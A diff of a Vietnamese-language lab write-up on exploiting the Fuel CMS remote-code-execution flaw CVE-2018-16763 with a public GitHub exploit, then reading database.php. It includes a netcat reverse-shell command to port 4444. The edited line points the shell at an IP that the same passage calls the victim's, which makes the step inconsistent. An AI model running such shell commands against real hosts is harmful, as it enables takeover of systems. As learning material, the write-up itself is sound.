@@ -58,13 +58,13 @@ Tìm kiếm trên Google, phát hiện Fuel CMS có lỗ hổng RCE tại nhữn
 
 https://github.com/padsalatushal/CVE-2018-16763
 
-Git clone code trên trang github trên về máy kali, sau đó chạy file python của git đó (ở đây là 10.0.2.4 là do xài máy khác để làm nên hơi lú)
+Git clone code trên trang github trên về máy kali, sau đó chạy file python của git đó (từ đoạn này ip bị lệch là do xài máy khác để làm nên hơi lú )(ip 10.0.2.4 vẫn là của máy victim)
 
 ![image](https://user-images.githubusercontent.com/97771705/223417730-70b91543-6dd8-416a-b789-594e6db99a61.png)
 
 Nhập command reverse shell: tạo ra một kết nối từ victim machine đến attacker machine, thông qua đó attacker có thể kiểm soát và thực thi các lệnh trên victim machine. Khi thực hiện được kết nối này, attacker có thể truy cập vào các tài nguyên và dữ liệu trên victim machine, và có thể thực hiện các hành động như cài đặt phần mềm độc hại, lấy mật khẩu và tạo backdoor để giữ lâu dài quyền kiểm soát truy cập vào victim machine.
 
->nc 10.0.2.5 4444 /bin/bash
+>nc 10.0.2.4 4444 /bin/bash
 
 Sau đó đọc thông tin trong database.php
 
